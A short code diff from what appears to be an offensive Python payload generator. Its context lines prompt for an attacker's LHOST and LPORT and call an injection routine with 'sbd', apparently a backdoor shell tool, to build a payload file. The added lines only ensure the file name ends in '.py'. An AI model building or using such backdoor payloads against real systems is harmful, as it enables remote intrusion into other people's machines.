@@ -62,6 +62,10 @@ Choice Hacking script to be injected
                 LPORT = input("[?] LPORT : ")
                 print("\n[!] Must added with .py format")
                 f_name = input("[?] File name : ")
+                if ".py" not in f_name:
+                    f_name += ".py"
+                else:
+                    pass
                 Injects("sbd", f_name, LHOST, LPORT)
                 print("[+] Payload Has Been Created -> {0}".format(f_name))
                 while True:
